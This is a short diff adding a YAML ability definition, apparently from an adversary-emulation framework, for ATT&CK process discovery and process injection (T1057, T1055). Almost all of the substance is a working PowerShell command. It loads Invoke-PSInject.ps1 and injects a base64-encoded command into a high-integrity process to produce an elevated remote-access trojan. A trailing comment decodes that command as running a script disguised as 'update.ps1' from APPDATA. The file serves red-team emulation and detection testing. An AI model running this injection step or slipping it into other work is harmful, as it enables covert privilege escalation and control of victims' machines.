@@ -1,0 +1,20 @@
+---
+
+- id: 088b8639-3f37-42cc-9dc8-01aabb645461
+  name: >-
+    3.B.1 - Process Discovery (T1057),
+    3.C.1 - Process Injection (T1055)
+  description: The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1055
+    name: Process Injection (T1055)
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+          Inject -PoshCode SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7AHUAcABkAGEAdABlAA==
+        payload: Invoke-PSInject.ps1
+
+# Encoded command: Import-Module $env:APPDATA\update.ps1;update
